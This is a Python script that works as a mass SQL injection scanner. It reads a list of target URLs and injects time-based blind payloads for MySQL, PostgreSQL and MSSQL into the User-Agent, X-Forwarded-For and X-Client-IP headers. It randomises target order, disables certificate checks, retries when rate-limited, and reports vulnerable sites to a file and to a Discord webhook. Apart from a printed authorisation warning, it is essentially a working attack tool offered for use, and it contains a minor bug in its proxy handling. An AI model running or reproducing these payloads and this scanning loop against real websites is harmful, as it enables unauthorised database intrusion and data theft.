import requests
import argparse
import time
import random
import urllib3
import os
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

base_headers = {
    "User-Agent": "normal-useragent",
    "X-Forwarded-For": "normal-xff",
    "X-Client-IP": "normal-clientip",
    "X-Requested-With": "XMLHttpRequest",
    "Accept": "*/*"
}

headers_to_test = ["User-Agent", "X-Forwarded-For", "X-Client-IP"]

methods_to_test = ["GET", "POST", "PUT", "OPTIONS", "HEAD", "PATCH"]

timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
output_file = "vulnerable_endpoints_%s.txt" % timestamp

error_patterns = ["mysql_fetch", "syntax error", "SQLSTATE", "unclosed quotation"]

payloads = {
    "mysql": 'nvn"xor(if(now()=sysdate(),SLEEP(6),0))xor"nvn',
    "postgresql": '1;SELECT pg_sleep(6)--',
    "mssql": '1;WAITFOR DELAY \'0:0:6\'--'
}

def send_discord_alert(url, method, header, attack_headers, webhook_url, path, db_type):
    if webhook_url:
        try:
            data = {
                "content": "🚨 **SQLi Vulnerable**\n**URL:** `%s`\n**Path:** `%s`\n**Method:** `%s`\n**Injected Header:** `%s`\n**DB Type:** `%s`\n**Attack Headers:**\n```%s```" % (
                    url, path, method, header, db_type, "\n".join("%s: %s" % (k, v) for k, v in attack_headers.items())
                )
            }
            requests.post(webhook_url, json=data, proxies=PROXIES, verify=False)
        except Exception as e:
            print(Fore.YELLOW + "[!!] Discord alert failed: %s" % str(e) + Style.RESET_ALL)

def get_baseline_time(url, method, path, proxies, verify_ssl):
    try:
        start = time.time()
        response = requests.request(method, url + path, headers=base_headers, data={"test": "test"}, timeout=10, verify=verify_ssl, proxies=proxies)
        return time.time() - start, response
    except Exception:
        return 0, None

def check_response_content(response):
    if response and response.text:
        for pattern in error_patterns:
            if pattern.lower() in response.text.lower():
                return True
    return False

def is_vulnerable(url, method, injected_header, path, db_type, payload, proxies, verify_ssl):
    try:
        baseline_time, baseline_response = get_baseline_time(url, method, path, proxies, verify_ssl)
        headers = base_headers.copy()
        headers[injected_header] = payload
        start = time.time()
        response = requests.request(method, url + path, headers=headers, data={"test": "test"}, timeout=10, verify=verify_ssl, proxies=proxies)
        duration = time.time() - start
        time_vuln = (duration - baseline_time) > 5
        content_vuln = check_response_content(response)
        status = response.status_code
        return time_vuln or content_vuln, status, method, response
    except Exception as e:
        print(Fore.YELLOW + f"  [!!] Exception: {str(e)}" + Style.RESET_ALL)
        return False, None, method, None

def wait_with_backoff(status_code, attempt, max_attempts=3, delay=3):
    if status_code == 429 and attempt < max_attempts:
        backoff_delay = 2 ** attempt
        print(Fore.YELLOW + f"  [!!] Rate limit hit, waiting {backoff_delay}s..." + Style.RESET_ALL)
        time.sleep(backoff_delay)
        return True
    time.sleep(delay)
    return False

def main(args):
    PROXIES = {}
    if args.proxy:
        PROXIES = {
            "http": args.proxy,
            "https": args.proxy
        }

    paths_to_test = args.paths.split(',')
    delay = args.delay
    webhook_url = args.webhook
    verify_ssl = args.verify_ssl

    print(Fore.RED + """
    WARNING: This tool is for authorized security testing only. 
    Unauthorized scanning of websites is illegal and unethical. 
    Ensure you have explicit permission from the website owner before proceeding.
    """ + Style.RESET_ALL)

    with open(args.file, 'r') as f:
        raw_urls = [line.strip() for line in f if line.strip()]

    urls = []
    for line in raw_urls:
        if not line.startswith("http://") and not line.startswith("https://"):
            line = "https://" + line
        urls.append(line)

    random.shuffle(urls)

    print("\n[+] Loaded %d targets. Starting scan...\n" % len(urls))

    for idx, url in enumerate(urls):
        print("\n[%d/%d] Testing: %s" % (idx + 1, len(urls), url))
        random.shuffle(paths_to_test)
        for path in paths_to_test:
            print(f"  [*] Testing path: {path}")
            random.shuffle(methods_to_test)
            for method in methods_to_test:
                random.shuffle(headers_to_test)
                attempt = 0
                while attempt < 3:
                    for db_type, payload in payloads.items():
                        for header in headers_to_test:
                            print("    [*] Trying %s with header %s (DB: %s)..." % (method, header, db_type))
                            vulnerable, status, used_method, response = is_vulnerable(url, method, header, path, db_type, payload, PROXIES, verify_ssl)
                            if vulnerable:
                                print(Fore.GREEN + "    [!!] Vulnerable! %s%s | Status: %s | Method: %s | Header: %s | DB: %s" % (url, path, status, used_method, header, db_type) + Style.RESET_ALL)
                                with open(output_file, "a") as out:
                                    out.write("%s%s | %s | %s | %s\n" % (url, path, used_method, header, db_type))
                                    out.flush()
                                    os.fsync(out.fileno())
                                send_discord_alert(url, used_method, header, base_headers, webhook_url, path, db_type)
                                break
                            else:
                                color = Fore.RED if status else Fore.YELLOW
                                print(color + "    [--] Not vulnerable | Status: %s" % (status if status else "Error/Timeout") + Style.RESET_ALL)
                        if vulnerable:
                            break
                    if vulnerable:
                        break
                    if status and wait_with_backoff(status, attempt, delay=delay):
                        attempt += 1
                        continue
                    else:
                        break
                if vulnerable:
                    break
            if vulnerable:
                break

    print("\n[+] Scan finished. Vulnerable results saved in: %s\n" % output_file)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Improved Multi-Method SQLi Scanner + Single File Export")
    parser.add_argument("-f", "--file", required=True, help="Path to file with target URLs")
    parser.add_argument("--webhook", help="Discord webhook URL for alerts", default="")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)", default=None)
    parser.add_argument("--paths", help="Comma-separated list of paths to test", default="/,/admin/,/api/")
    parser.add_argument("--delay", type=float, help="Delay between requests (seconds)", default=3.0)
    parser.add_argument("--verify-ssl", action="store_true", help="Enable SSL verification (default: disabled)")
    args = parser.parse_args()
    main(args)
